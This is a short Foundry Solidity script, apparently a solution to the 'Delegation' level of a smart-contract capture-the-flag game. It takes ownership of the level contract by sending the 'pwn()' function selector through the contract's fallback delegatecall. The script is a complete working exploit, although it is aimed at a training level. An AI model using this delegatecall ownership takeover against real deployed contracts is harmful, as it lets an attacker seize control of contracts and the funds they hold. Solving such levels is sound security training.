// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/6-Delegation.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Delegation delegation = Delegation(0x77e61C92d77ce801E6eC620887a0dF441d21D371);

    function run() external{
        vm.startBroadcast();

        // Call Delegation instance with 4-byte selector for "pwn()"
        address(delegation).call(abi.encodeWithSignature("pwn()"));

        vm.stopBroadcast();
    }
}